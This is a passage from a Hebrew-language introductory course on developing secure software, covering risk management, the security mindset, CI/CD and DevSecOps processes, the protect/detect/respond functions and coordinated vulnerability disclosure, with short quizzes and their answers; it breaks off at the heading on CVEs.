החיים כרוכים בסיכון. הציפייה שלא יהיו סיכונים בחיים אינה מציאותית. בפרט, ישנם סיכונים לכל מי שמשתמש בתוכנה שתפתחו מכיוון שהיא עלולה להיות בעלת פגיעויות. כאשר מפתחים תוכנה, סביר להניח שיעשו טעויות, וחלק מהטעויות הללו עלולות להוביל בסופו של דבר לפגיעויות אבטחה. מישהו עשוי אפילו לנסות להכניס בכוונה פגיעויות או קוד זדוני לתוכנה שלך, או לתוכנה שאנו תלויים בה, במהלך הפיתוח שלה. אפילו טכניקות חזקות מאוד להתמודדות עם פגיעויות חייבות להתבסס על הנחות או יכולות רק להוריד רק *חלק* מהסיכונים הקשורים לאבטחה, כך ששוב, זה לא מציאותי לצפות שלא יהיו סיכונים.

אבל כאשר מפתחים תוכנה, יש לנקוט צעדים סבירים ל*ניהול* סיכונים כך שהסיכונים יהיו כה נמוכים (הן למפתחים והן למשתמשים שלה) שהם מקובלים. בספרו, "[*הכישלון של ניהול סיכונים: מדוע הוא שבור וכיצד לתקן אותו*](https://onlinelibrary.wiley.com/doi/book/10.1002/9781119198536)"  (2009), דאגלס האברד מגדיר ניהול סיכונים כ *"זיהוי, הערכה ותעדוף של סיכונים... ואחריו יישום מתואם וחסכוני של משאבים כדי למזער, לפקח ולשלוט בהסתברות או בהשפעה של אירועים מצערים".*

אחד הסיכונים בעת פיתוח ופריסה של תוכנה הוא שהתוקפים ינצלו את נקודות התורפה שלה ויגרמו נזק לאחרים. לא ניתן למנוע מהתוקפים לנסות לתקוף את המערכת. למעשה:

**אם אנשים יתחילו להשתמש בתוכנה שאתה מפתח, _צפה_ שיריבים אינטליגנטיים ינסו לתקוף אותה.**

אמנם לא ניתן למנוע מתוקפים לתקוף תוכנה, אך באפשרותך להקשות על התקפה להצליח, או להפחית את ההשפעה של התקפה מוצלחת. באפשרותך לעשות זאת על-ידי נקיטת צעדים לאורך פיתוח התוכנה ופריסתה כדי להפחית את הסיכונים לרמה נמוכה באופן מקובל. אם התוכנה שלך נמצאת בשימוש נרחב או תלויה במשימות חיוניות, ניהול סיכונים אלה חשוב במיוחד עבור המשתמשים שלך.

*אל* תחכו לחשוב על סיכונים עד שהם קורים. אז הם כבר לא סיכונים - הם *בעיות*. קל וזול יותר לטפל בסיכונים *לפני* שהם הופכים לבעיות! הרבה יותר קל לתכנן את התוכנה כדי למזער סיכונים מאשר לשנות את התוכנה מאוחר יותר. תכנון זה טוב יותר גם עבור המשתמשים, המוניטין המקצועי שלך, המוניטין של התוכנה והמוניטין של כל ארגון קשור.

#### תהליך ניהול סיכונים

פרויקטים קטנים עם השפעות נמוכות יחסית יכולים לבחור לבצע את ניהול הסיכונים באופן לא רשמי. פרויקטים גדולים עם השפעות גדולות צריכים להיות קפדניים יותר. ללא קשר, ניתן לחלק את ניהול הסיכונים לפעילויות הבאות (על פי [*מדריך ניהול הסיכונים, הסוגיות וההזדמנויות של משרד ההגנה האמריקאי לתוכניות רכש ביטחוניות, 2017*](http://acqnotes.com/wp-content/uploads/2017/07/DoD-Risk-Issue-and-Opportunity-Management-Guide-Jan-2017.pdf)):

1. **תכנון סיכונים**. קבעו את תהליך ניהול הסיכונים של הפרוייקט.

2. **זיהוי סיכונים**. זהו מה *עלול* להשתבש. טריק טוב הוא לחפש פרויקטים דומים - אילו סיכונים ובעיות היו להם? מומלץ לרשום רשימה זו כדי שניתן יהיה לשתף אותה. לענייננו, אנו מודאגים מסיכונים הקשורים לאבטחה.

3. **ניתוח סיכונים**. קבעו את שתי התכונות העיקריות של סיכון: **הסבירות** לאירוע הבלתי רצוי **וחומרת** תוצאותיו. סיכון הופך לחשוב יותר אם הסבירות ו/או החומרה שלו גדלות.

4. **טיפול בסיכונים**. קבעו מה תעשו בנוגע לסיכון. עבור כל סיכון, קיימות מספר אפשרויות:

    1. **קבלה (וניטור):** הסיכון מתקבל, אך מנוטר ומועבר לבעלי העניין שלו (כולל המשתמשים בו). אפשרות זו סבירה אם הסבירות או החומרה נמוכות.

    2. **הימנעות**. הסיכון מתבטל על ידי ביצוע שינוי כלשהו. כלומר, הסבירות שלו הופכת לאפס או חומרתו הופכת ללא רלוונטית. אפשרות זו נהדרת אם ניתן לקיימה. לדוגמה, ייתכן שניבחר *לא* לאסוף נתונים מסוימים (ואז לא נוכל לאבד את סודיותם מאוחר יותר), או לבחור שפת תיכנות שבה סוגים מסוימים של פגיעויות אינם יכולים להתרחש (ביטול הסיכונים מסוגים אלה של פגיעויות).

    3. **העברה**. הסיכון מועבר למישהו אחר (למשל, רכישת ביטוח, או שינוי המערכת כך שרכיב אחר יהיה אחראי על הסיכון הזה ומפתחיו יקבלו אותו). לדוגמה, במקום לקחת על עצמנו את הסיכונים של זיהוי ואימות שגויים (I&A), נסמוך על מערכת קיימת כלשהי שתממש זיהוי ואימות (I&A).

    4. **שליטה**. להפחית באופן פעיל את הסיכון לרמה מקובלת. מכיוון שחשיבותו של סיכון תלויה בסבירות ובחומרתו, אפשרות זו משמעותה היא ביצוע שינויים כדי להפוך את הסבירות ו/או החומרה לנמוכה (או לפחות נמוכה יותר). עבור סיכונים הקשורים לאבטחה, לעתים קרובות זה מה שעליך לעשות. אין דרך אחת לעשות זאת, לכן צריך להפחית באופן רציף את הסבירות והחומרה באמצעות פיתוח תוכנה ופריסה עד שהסיכונים מקובלים. לדוגמה, יש באפשרותנו:

        1. לוודא שכל המפתחים והממפתחות יודעים על סוגים מסוימים של טעויות נפוצות שמובילות לסוג מסוים של פגיעות (כדי שיוכלו להימנע מהן),

        2. שימוש בגישות (כגון תכנון מאובטח, שפות תכנות ספציפיות וממשקי גישה (API)) שנועדו להקטין את הסבירות לפגיעויות אלה,

        3. שימוש בכלים ובביקורות כדי לזהות טעויות (כולל פגיעויות), וכן

        4. הקשחת המערכת. כלומר שינוי המערכת כך שפגמים נוטים פחות להפוך לפגיעויות אבטחה. נדון בהקשחה בהמשך הקורס.

5. **ניטור סיכונים**. קבעו כיצד הסיכונים משתנים עם הזמן. לאורך זמן, השאיפה היא "לשרוף" את הסיכונים שלך - כלומר, הצעדים ששננקטים צריכים לצמצם באופן מתמיד את סבירות הסיכון או חומרתו לרמות מקובלות.

ניהול סיכונים *אינו* מסובך. בעצם, זהו היגיון בריא. אבל כאשר עובדים על פתרון הבעיות הנוכחיות קל לשכוח סיכונים, שהם רק בעיות *פוטנציאליות*. עם זאת, מחשבה *מראש* יכולה לחסל בעיות פוטנציאליות לפני שהן הופכות לבעיות אמיתיות.

#### זיהוי סיכונים

שימו לב שהצעד הראשון (מעבר לתכנון) הוא זיהוי סיכונים. אבל איך מזהים את הסיכונים של פגיעויות אבטחה? ברור שאנשים רבים *אינם* מבחינים בסיכונים הנובעים מפגיעויות אבטחה.

לברוס שנייר יש את הסיפור הנפלא הזה ([*הלך מחשבה אבטחתי, 2008*](https://www.schneier.com/blog/archives/2008/03/the_security_mi_1.html)):

> *"דוד מילטון בע״מ מוכר חוות נמלים לילדים מאז 1956. לפני כמה שנים, אני זוכר שפתחתי אחת עם חבר. הקופסא לא כללה נמלים אמיתיות. במקום זאת, היה כרטיס שמילאת עם הכתובת שלך, והחברה הייתה שולחת לך כמה נמלים. חברי הביע פליאה על כך שאתה יכול לקבל נמלים שנשלחו אליך בדואר. [ברוס שנייר] השיב: 'מה שבאמת מעניין הוא שהאנשים האלה ישלחו נמלים חיות לכל מי שתגיד להם.' ... אבטחה דורשת חשיבה מסוימת. מומחי אבטחה - לפחות הטובים שבהם - רואים את העולם אחרת. הם לא יכולים להיכנס לחנות בלי לשים לב איך הם יכולים לגנוב ממנה. הם לא יכולים להשתמש במחשב מבלי לתהות על פגיעויות האבטחה. הם לא יכולים להצביע בבחירות מבלי לנסות להבין כיצד ניתן להצביע פעמיים".*

האם ניתן ללמד את הלך הרוח הזה? מניסיוננו זה אפשרי, לפחות בחלקו. רשימות פעולות לביצוע, הדרכה וטיפים עוזרים להזכיר לאנשים לחפש דברים מסוימים, במיוחד כשהם בנויים מחוויות עבר רלוונטיות. טכניקה נוספת שעוזרת היא פיתוח של חשיבה מעט פרנואידית. לא רמה קלינית של פרנויה, אלא דאגה מתמדת ברמה נמוכה שישנם סיכונים רבים ושיש אנשים שבאמת רוצים להזיק לך. זכרו כי משתמשים מסוימים ינסו בכוונה לגרום למצבי קצה, מצבים לא סבירים או בלתי צפויים, בתקווה שהתקפות כאלה יעניקו להם הרשאות לא מוצדקות. כתוצאה מכך, בעת כתיבת תוכניות מאובטחות, פרנויה היא סגולה. דיבור על סיכונים עם אחרים, סקירת תוכניות עם אחרים וחיפוש מתמיד אחר סיכונים יכולים כולם לסייע בזיהוי סיכונים כך שניתן יהיה לטפל בהם *לפני* שהם הופכים לבעיות.

#### אבטחה היא תהליך, לא מוצר

במאמרו "[*תהליך האבטחה" (2000)*](https://www.schneier.com/essays/archives/2000/04/the_process_of_secur.html), ברוס שנייר הסביר באופן מפורסם כי

> *"אבטחה היא תהליך ולא מוצר... אין דבר כזה אבטחה מושלמת. באופן מעניין, זו לא בהכרח בעיה. ... אבטחה לא חייבת להיות מושלמת, אך הסיכונים צריכים להיות ניתנים לניהול...".*

העולם משתנה. אופן השימוש בתוכנה שלך משתנה. נקודות תורפה חדשות מתגלות. הפלטפורמה והספריות של התוכנה משתנות. חוקים, מדיניות החברה ויעדים משתנים. תוכנה שהייתה מאובטחת לפני שנה או חמש שנים עשויה שלא להיות מספקת כיום.

מכיוון שאבטחה היא תהליך, היא לא רק "שגר ושכח". צריך לשקול אבטחה כל הזמן.

#### רשימות פעולות לביצוע אינן אבטחה

אל תשוו בין רשימות, הנחיות ועצות לבין אבטחה. לעתים קרובות הם *שימושיים*, מכיוון שהם יכולים לעזור לך לזהות סיכונים ודרכים סבירות לטפל בהם. רשימות פעולות לביצוע, הנחיות וטיפים טובים יכולים לחסוך לך הרבה זמן וצרות, והם גם עזרים נהדרים לעזור לאחרים להעריך את האבטחה של תוכנות מסוימות. דברים טובים נבנים עם ניסיון של אחרים, יהיה זה מטופש להתעלם מכך.

אבל אלו הם רק עזרים למטרה האמיתית; הם אינם המטרה עצמה. ניתן לעקוב אחר רשימות פעולות לביצוע, הנחיות וטיפים, ועדיין לקבל תוכנה לא מאובטחת להחריד. ניתן גם *להתעלם* מכמה הנחיות לא רלוונטיות ועדיין לקבל תוכנה מאובטחת מאוד. בקיצור:

**_אין תחליף לחשיבה._**

קורס זה ייתן לך מספר טיפים שיעזרו לך להפחית סיכונים, תוך התמקדות בשיעורים שמפתחים קודמים למדו. אבל אלו רק טיפים; הם רק *כלי עזר* לפיתוח תוכנה מאובטחת. בזמן פיתוח התוכנה, יש לחשוב ללא הרף על הדרכים שבהן תוקף עשוי לנסות לנצל את המערכת שלך. יש לצפות מראש את הבעיות הפוטנציאליות - כל עוד הן עדיין סיכונים - ולצמצם אותן.

#### חידון 1.4: ניהול סיכונים

\>\>מטרת פיתוח תוכנה מאובטחת היא להסיר את כל סיכוני האבטחה האפשריים. אמת או שקר?<<

( ) נכון

(x) לא נכון

[הסבר]

זה לא נכון. זה היה יכול להיות נהדר אם יכולנו לחסל את כל הסיכונים, אבל זה לא סביר. במקום זאת, המטרה שלנו היא להפחית את ההסתברות והחומרה של כל הסיכונים, כולל פגיעויות אבטחה, לרמות מקובלות.

[הסבר]

### תהליכי פיתוח / הגנה לרוחב

אין מנגנון קסם לייצור תוכנה מאובטחת. במקום זאת, עליך לשקול באופן רציף אבטחה לאורך כל תהליך פיתוח ופריסת התוכנה. התחשבות באבטחה בכל עת, דרך כל תהליכי הפיתוח והפריסה, נקראת לעתים "הגנה לרוחב". בואו נדבר על התהליכים המשמשים לפיתוח תוכנה ופריסה.

#### תהליכי פיתוח ופריסת תוכנה פרטניים

כאשר מפתחים תוכנה, ישנם תהליכים מסוימים שכדאי וצריך לעשות. אלה כוללים:

* קביעת *דרישות* (מה התוכנה חייבת לעשות). מטעמי אבטחה, ודאו שידוע לכם אילו דרישות אבטחה התוכנה צריכה לספק. לדוגמה, האם יש נתונים שצריך לשמור בסודיות?

* קביעת *תכנון המערכת וארכיטקטורה* (כיצד לחלק את הבעיה לרכיבים המקיימים אינטראקציה כדי לפתור אותה). בהמשך קורס זה נדון בעקרונות שונים של תכנון מערכת מאובטח שיעזרו לך לתכנן מערכת קלה יותר לאבטחה.

* *בחירת רכיבים הניתנים לשימוש חוזר* (באילו חבילות/ספריות הניתנות לשימוש חוזר נישתמש). עליך להעריך את הרכיבים שיהיו בשימוש, מכיוון שכל אחת מהפגיעויות שלהם עלולה להפוך לפגיעויות של התוכנה שלך. רכיבים אלה שנעשה בהם שימוש חוזר מגיעים ממקום כלשהו, ותלויים באופן טרנזיטיבי ברכיבים אחרים. הסט של כל התלות הזו, כולל מאיפה הם באים ואיך הם מגיעים אליך בסופו של דבר, היא *שרשרת האספקה שלך*.

* *ליישם* אותו (לכתוב את הקוד). רוב פגיעויות האבטחה שנעשו במהלך היישום הן סוגים נפוצים ספציפיים; ברגע שידוע מה הם, ניתן להימנע מהם.

* *אמתו* אותו (כתבו / יישמו בדיקות והשתמשו במנתחי תוכנה (אנלייזרים) כדי לקבל ביטחון שהקוד עושה את מה שהוא אמור לעשות). עליך לבדוק כדי לוודא שהמערכת שלך מאובטחת, ולהשתמש בכלים שיעזרו לך למצוא פגיעויות לפני שהתוקפים ימצאו אותן.

* *פרסו* אותו. עליך לעזור להבטיח שהמשתמשים יוכלו לקבל את הגירסה הנכונה, שהיא מאובטחת כברירת מחדל ושהם יוכלו להפעיל אותה בקלות בצורה מאובטחת.

#### שימוש בתהליכים אלה יחד

כמובן שצריך להשתמש בתהליכים אלה יחד.

טעות נפוצה היא לנסות לבצע את תהליכי פיתוח התוכנה האלה ברצף קפדני (להבין את כל הדרישות, ואז לעבד את תכנון המערכת כולו, ולאחר מכן ליישם את המערכת כולה, ולאחר מכן לאמת אותה). הניסיון ליצור תוכנה ברצף קפדני שכזה נקרא  מודל *מפל המים (waterfall)*. מודל מפל המים הוא מבלבל מכיוון שביצוע תהליכים אלה ברצף סידרתי *נראה* קפדני והגיוני בהתחלה. בשנת 1970, וינסטון ו. רויס הסביר במאמרו [*ניהול הפיתוח של מערכות גדולות: מושגים וטכניקות*](https://dl.acm.org/doi/10.5555/41765.41801) מדוע ניסיון לעקוב אחר תהליכים אלה ברצף סידרתי ("מפל מים") הוא מסוכן ביותר ברוב הנסיבות ויש להימנע ממנו בדרך כלל.

טעות נפוצה נוספת היא להטמיע רכיבי תוכנה באופן עצמאי ולעולם לא לשלב ולבדוק אותם יחד עד שהמערכת תושלם באופן מלא. זו בדרך כלל טעות, מכיוון שזה יכול להוביל לחוסר יכולת לגרום לרכיבים לעבוד יחד ללא תקלות.

בפועל, במהלך פיתוח התוכנה לרוב יתבצעו תהליכים אלה במקביל, תוך העברת מידע בין התהליכים, ככל שמידע חדש נלמד. ישנן דרכים רבות לשלב תהליכים, אשר תלויות בגורמים רבים כגון גודל הצוות וכמה אמינה התוצאה צריכה להיות. ישנן גישות רבות ושונות, כולל גישות פיתוח זריז (אג'ילי, Agile) למיניהן, פיתוח אינקרמנטלי (הדרגתי), פיתוח אבולוציוני ומפל המים. לצורך קורס זה, אנו נתמקד בהיבטי האבטחה בזמן בחירת התהליך ליישום, ולא נתמקד בפרטי גישות אלה. לכן החומרים של הקורס יכולים להיות מוכלים ללא קשר לגישה. עם זאת, בואו נסתכל על כמה שיטות עבודה ומונחים ספציפיים שיכולים להיות חשובים לאבטחה.

פרקטיקה מומלצת מאוד היא להשתמש באינטגרציה רציפה (CI), שהיא הנוהג למזג (merge) עותקים עובדים של פיתוח לתוך ענף ראשי משותף (למשל, אחת לכמה ימים או פעמים רבות ביום). מיזוג שגרתי זה מפחית את הסיכונים של רכיבים לא לעבוד יחד אם האינטגרציה ביניהם התעכבה, וזה דבר טוב. עם זאת, CI מוצלח דורש דרך לקבוע אם הרכיבים אכן עובדים יחד. בעיה זו נפתרת על-ידי שימוש בתהליך CI (פייפליין) - תהליך שפועל בכל פעם שקוד חדש מתמזג כדי להבטיח שהוא ניבנה כהלכה ועובר סדרה של בדיקות אוטומטיות ובדיקות אחרות.

ארגונים רבים רוצים לפרוס תוכנות/שירותים במהירות רבה יותר, ואימצו גישות שונות כדי לעשות זאת, תוך התבססות על תהליכי פיתוח תוכנה סטנדרטיים אלה. ההגדרות משתנות, אך הנה כמה מונחים נפוצים:

* אספקה רציפה (CD או CDE) נועדה להבטיח ש *"יישום נמצא תמיד במצב מוכן לסביבת הייצור (פרודקשן), לאחר שעבר בהצלחה בדיקות אוטומטיות ובדיקות איכות [על ידי שימוש בשיטות בדיקה שונות] כדי לספק תוכנה באופן אוטומטי לסביבה דמוית ייצור"* (Mojtaba Shahin, מוחמד עלי באבר ו- Liming Zhu[*, אינטגרציה רציפה, אספקה ופריסה: סקירה שיטתית על גישות, כלים, אתגרים ושיטות עבודה, 2017*](https://arxiv.org/abs/1703.07019)). שימו לב שהתוכנה לא בהכרח משוחררת או נפרסת ללא שלב אישור נפרד.

* פריסה רציפה (CD)  "*הולכת צעד אחד קדימה [מאשר אספקה רציפה] ופורסת את היישום באופן אוטומטי ורציף לסביבות ייצור או סביבת הלקוח"* (Mojtaba Shahin, מוחמד עלי באבר ו-Liming Zhu[*, אינטגרציה רציפה, אספקה ופריסה: סקירה שיטתית על גישות, כלים, אתגרים ופרקטיקות, 2017*](https://arxiv.org/abs/1703.07019)).

* דב-אופס (DevOps) מתמקדת בתיאום ובשיתוף פעולה בין צוותי פיתוח התוכנה (Dev) ותפעול התשתית - (IT Ops) (Mike Loukides, [*שקילת מחדש של "מהו DevOps", 2014*](http://radar.oreilly.com/2014/06/revisiting-what-is-devops.html)), כדי לקצר את זמן הפיתוח והפריסה. בפועל, זה כולל בדרך כלל אספקה רציפה (CDE) ועשוי לכלול פריסה רציפה (CD).

* דבסקאופס (DevSecOps) (נקרא גם SecDevOps) הוא DevOps, אך באופן ספציפי משלב תהליכי אבטחה בתהליך הפיתוח והתפעול (Red Hat, [*מה זה DevSecOps?*](https://www.redhat.com/en/topics/devops/what-is-devsecops))

* גיטאופס (GitOps) "היא דרך ליישם פריסה רציפה עבור יישומי ענן (קלאוד-נייטיב Cloud Native). היא מתמקדת בחוויה ממוקדת-מפתחים בעת תיפעול התשתית, באמצעות כלים המוכרים למפתחים, כולל כלי Git ופריסה רציפה.  הרעיון המרכזי של GitOps הוא קיום מאגר Git המכיל תמיד תיאורים הצהרתיים של התשתית הרצויה בנקודת זמן זו בסביבת הייצור ותהליך אוטומטי כדי להתאים את סביבת הייצור למצב המתואר במאגר. אם רוצים לפרוס יישום חדש או לעדכן יישום קיים, צריך רק לעדכן את המאגר - התהליך האוטומטי מטפל בכל השאר" <https://www.gitops.tech/>. הגדרות דומות כוללות "בתהליך GitOps משתמשים במאגרי Git כמקור אמת יחיד כדי לספק תשתית כקוד (Infrastructure as Code)". (רד האט,  [*מה זה גיטאופס?*](https://www.redhat.com/en/topics/devops/what-is-gitops) ) ו-"GitOps היא מסגרת תפעולית שלוקחת שיטות עבודה מומלצות של DevOps המשמשות לפיתוח יישומים כגון בקרת גרסאות, שיתוף פעולה, תאימות ו-CI/CD, ומחילה אותן על אוטומציה של תשתיות." (GitLab,  [*מה זה GitOps? *](https://about.gitlab.com/topics/gitops/)).

הנושאים המוזכרים מעלה תלויים בבדיקות אוטומטיות ובבדיקות איכות, ומבחינת אבטחה, מה שקריטי הוא שיש לשלב כלים לבדיקת פגיעויות אבטחה ובעיות אבטחה פוטנציאליות בבדיקות האוטומטיות ובבדיקות האיכות הללו. לדוגמה, עליך לוודא שכלים נמצאים בצינור ה- CI שלך בודקים אם קיימות בעיות אבטחה שונות, כך שבעיות אלה יזוהו מוקדם. כלי אבטחה שעלולים לקחת זמן רב עד לקבלת התוצאה עשויים להיות מופעלים במקביל אך לשמש כ"שער "עבור CDE. בהמשך הקורס נדון בהרחבה על כלים לתמיכה באבטחה.

הכנסת כמה "כלי אבטחה" לחבילת בדיקות אוטומטית, כשלעצמה, נוטה להיות לא יעילה. כלי אבטחה בדרך כלל לא יידעו מה התוכנה אמורה לעשות (הדרישות). לדוגמה, כלי אבטחה לא יידעו איזה מידע הוא סודי. כלי אבטחה בדרך כלל לא יכולים לזהות בעיות בסיסיות בתכנון התוכנה, וגם אם הם יכולים, תיקון בעיות תכנון מערכת אינו יכולת הקיימת לכלי הזיהוי.  כלי אבטחה מפספסים לעתים קרובות פגיעויות, במיוחד אם התוכנה מתוכננת בצורה לא יעילה. ואולי הכי חשוב, מידע מכלי אבטחה בדרך כלל אינו מובן למפתחים ומפתחות אם לא קיימת  הבנה בסיסית על אבטחה. יש ביטוי ישן שעדיין נכון: *"טיפש עם כלי הוא עדיין טיפש".*

**בקיצור:** כלים חשובים, אך הם לא מספיקים. עליך לשקול באופן רציף אבטחה לאורך כל הפיתוח והפריסה, על מנת שסיכונים הקשורים לאבטחה יזוהו ויטופלו. יש לשקול כיצד המערכת שלך עלולה להיות מותקפת (זיהוי הסיכונים שלה), לנתח סיכונים כדי לקבוע את הסבירות שהמערכת תנוצל ואת חומרת הסיכון, ולאחר מכן להחליט מה ניתן או צריך לעשות. הוספת כלי אבטחה לתהליך האינטגרציה הרציף שלך בהחלט כלול תחת צעדים אלו, אך כלים אלה יהיו יעילים הרבה יותר אם תהיה מחשבה על אבטחה לאורך כל הפיתוח והפריסה. בהמשך הקורס נעסוק בכיצד יש לעשות זאת. בסופו של דבר נדון בכלים, אבל רק אחרי שנבין מה הכלים עוזרים לנו לעשות.

כמו כן, עליך להתמקד בשיפור מתמיד, הן של התוכנה עצמה והן של התהליכים שבהם משתמשים כדי לפתח אותה. אם תכנון המערכת מקשה להשתמש ב-API הנוכחיים בצורה מאובטחת, הפוך אותו לקל לשימוש בצורה מאובטחת. חפשו דרכים להקשיח את התוכנה מפני התקפות. שנו את תהליכי האימות על-ידי הוספת כלים חדשים, או שינוי התצורה של כלים קיימים, כדי לזהות יותר ויותר בעיות לפני שהן משוחררות למשתמשים.

#### חידון 1.5: תהליכי פיתוח / הגנה לרוחב

\>\>כדי לפתח תוכנה מאובטחת, צריך תמיד לפתח בקפדנות את כל הדרישות, ואז לפתח את העיצוב המלא שלך, ורק אז להתחיל ליישם את התוכנה. אמת או שקר?<<

( ) נכון

(x) לא נכון

[הסבר]

זה לא נכון. זוהי גישה של "מפל מים" והיא בדרך כלל דרך מסוכנת מאוד לפיתוח תוכנה. צריך מושג על מה שמנסים להשיג, כמובן, אבל המציאות מורכבת יותר: ככל שהעיצוב, יישום והפריסה מתקדמים, בקש וקבל משוב על מה הדרישות באמת *צריכות* להיות.

[הסבר]

#### חידון 1.6: תהליכי פיתוח / הגנה ברוחב

\>\>כדי לפתח תוכנה מאובטחת, פשוט יש להוסיף כלי אבטחה לתהליך האינטגרציה הרציף שלך. אמת או שקר?<<

( ) נכון

(x) לא נכון

[הסבר]

זה שקר, אבל זו שאלה ערמומית מכיון שיש בה גרעין של אמת.

חשוב שיהיו כלי אבטחה בתהליך האינטגרציה הרציף שלך. לא משנה עד כמה גישת התכנון והיישום שלך טובה, טעויות ייעשו, וכלים בתהליך האינטגרציה הרציף יעזרו לך למצוא כמה מהטעויות הללו.

אבל פשוט "להוסיף כלי אבטחה" לא יספיק. אף כלי לא יכול לתקן תכנון גרוע, וכלים יחמיצו פגיעויות ביישום. חייבים לחשוב על אבטחה במהלך כל תהליך הפיתוח והתפעול.

[הסבר]

### להגן, לזהות, להגיב

תוכנה מפותחת על מנת שיהיה בה שימוש, לכן בואו נסתכל בקצרה על אבטחה מנקודת מבט תפעולית.

ארגונים לא צריכים להניח שהם יכולים להגן על המערכות שלהם מפני התקפה כל הזמן. תוקפים לפעמים פורצים דרך. לדוגמה,  מסגרת אבטחת הסייבר [של NIST בארה"ב](https://www.nist.gov/cyberframework) מזהה חמש פונקציות מתמשכות והקיימות בו-זמנית שארגונים צריכים ליישם בפעילותם כדי לנהל את סיכוני אבטחת הסייבר:

1. **זיהוי***<br>"פיתוח הבנה ארגונית לניהול סיכוני אבטחת סייבר למערכות, אנשים, נכסים, נתונים ויכולות".*

2. **הגנה**<br>*"פיתוח ויישום אמצעי הגנה מתאימים כדי **להבטיח** אספקה של שירותים קריטיים".*

3. **גילוי**<br>*"פיתוח ויישום פעילויות מתאימות כדי לגלות את התרחשותו של אירוע אבטחת סייבר".*

4. **תגובה**<br>"פיתוח ויישום פעילויות מתאימות לנקיטת פעולה בנוגע לאירוע אבטחת סייבר שזוהה".

5. **שחזור**<br>*"פיתוח ויישום פעילויות מתאימות לשמירה על תוכניות עמידות ושיקום יכולות או שירותים שנפגעו עקב תקרית אבטחת סייבר".*

רשימה זו של חמש פונקציות מפושטת לעתים לשלוש פונקציות בסיסיות: **הגנה**, **זיהוי **ותגובה****. בעת שימוש ברשימה פשוטה זו של שלוש פונקציות בסיסיות, זיהוי נחשב כחלק מלהגן, ושיחזור נחשב חלק מתגובה. בקורס זה נשתמש ברשימה המקוצרת של פונקציות בסיסיות.

אף אחת משלוש הפונקציות הבסיסיות הללו (הגנה, זיהוי ותגובה) אינה יעילה בפני עצמה. אם ישנה רק הגנה, אך לא קיים זיהוי או שחזור, אזי תוקף שפורץ את ההגנות שלך יכול לעשות מה שהוא רוצה. אם רק יהיה זיהוי או שחזור, מבלי הגנה על המערכת שלך, שום עבודה לעולם לא תעשה; אם במקום זאת תקדישו את כל זמנכם לזיהוי או לשחזור, עד מהרה אף אחד לא יסמוך על המערכת שלכם. בנוסף, ההתאוששות היא חסרת תועלת ללא זיהוי, כי לעתים קרובות לא ידוע *מתי* להתאושש.

נדבר הרבה על אמצעי הגנה. בדרך כלל זול יותר למנוע בעיות מאשר לטפל בהן מאוחר יותר (ישנם פתגמים ישנים אשר חלים כאן, למשל,  "*גרם של מניעה שווה קילו של תרופה"*). אך נדון גם באמצעים כדי לזהות ולהגיב, מכיון שאף הם נחוצים. לכל הפחות, יישומים גדולים יותר צריכים לכלול מנגנונים כמו רישום (לתמיכה בזיהוי) וגיבוי (לתמיכה בשחזור), מכיוון שהם נחוצים ביישומים שאנו פורסים.

#### חידון 1.7: להגן, לזהות, להגיב

\>\>בחר את התשובה הנכונה.<<

(!) הגנה היא היכולת החשובה ביותר באבטחה; אם ההגנה שלך טובה מספיק, אין צורך בזיהוי או בתגובה. {{לא, כי תמיד יש אפשרות לטעות בלתי צפויה.}}

( ) תגובה היא היכולת החשובה באבטחה; אין אפשרות להגן על הכל בכל מקרה, לכן יש להתמקד בתגובה. {{לא, כי בלי הגנה טובה תהיי מוצפת בבעיות.}}

(x) באבטחה יש צורך בהגנה, זיהוי ותגובה.

### פגיעויות

פגיעות הינה אי עמידה בדרישת אבטחה כלשהי. בדרך כלל פגיעויות אינן מכוונות, אך הן יכולות להיות גם מכוונות. לדוגמה, ייתכן שמישהו הכניס במכוון קוד זדוני (או לפחות ניסה לעשות זאת) בתוכנה שבה נעשה שימוש חוזר או מפתח, כגון דלת אחורית (דרך להשיג גישה לא מורשית) או פצצת לוגיקה (קוד המבצע פונקציה זדונית כאשר מתקיימים התנאים שצוינו). קורס זה מתמקד אך ורק בתוכנה, אם כי כמובן שגם לחומרה יכולות להיות נקודות תורפה.

החברה המודרנית תלויה בתוכנה (ובחומרה), וכתוצאה מכך, חל גידול מסיבי במספר הפגיעויות הידועות. לכן קשה לענות על שאלות פשוטות כמו  "*האם תיקנת את הפגיעות המסוימת הזו"*? מאוחר יותר, נתאר כמה מאמצים שנעשו כדי לזהות ולטפל בפגיעויות ידועות.

#### דיווח וטיפול בפגיעויות - סיכום קצר

פגיעויות אבטחה בתוכנה יכולות להימצא מסיבה זו או אחרת. חוקרי אבטחה, הופכים את מציאת נקודות התורפה של תוכנה לחלק מהקריירה שלהם.

ברוב המקרים, מאתרי פגיעויות אלה מדווחים על הפגיעות לספקי התוכנה באמצעות תהליך *"גילוי מתואם מתוזמן (CVD - Coordinated Vulnerability Disclosure)".* המוצאים מדווחים באופן פרטי על הפגיעות לספק(ים), ונותנים לספק(ים) זמן מוגבל (המכונה *"זמן האמברגו"*) כדי לתקן את הפגיעות. לאחר זמן אמברגו זה (בדרך כלל 14-90 יום), או כאשר הפגיעות תוקנה ולמשתמשים הייתה הזדמנות להתקין את הגרסה המשודרגת של התוכנה, הפגיעות נחשפת בפומבי. לפעמים תהליך זה נקרא רק *"גילוי מתואם",* אך אנו רוצים להבהיר באופן חד משמעי כי בתהליך זה, הפגיעות תיחשף בפומבי אם הספק לא יצליח לתקן אותה בזמן.

בפועל, הדברים מסובכים יותר. לעתים קרובות ישנם ספקים מרובים ובעלי עניין אחרים המעורבים. תכנון מראש הוא חשוב מאוד עבורך (כמפתח או מפתחת/ספק או ספקית) על מנת לאפשר דיווח קל ונגיש על פגיעויות, וכדי שיהיה אפשרי לדון בנושא באופן פרטי עם גורמים מהימנים, וכדי שאפשר יהיה לתקן במהירות את כל הבעיות. בהמשך הקורס נדון כיצד לקבל ולדווח על פגיעויות, כולל הפניות למסמכים שימושיים בנושא. בנוסף, יש כל כך הרבה תוכנות וכל כך הרבה פגיעויות שיש צורך לעקוב אחר פגיעויות. הצורך הזה במעקב הוביל ליצירת המאגר לפגיעויות וחשיפות נפוצות (CVE).

#### פגיעויות וחשיפות נפוצות (CVE)

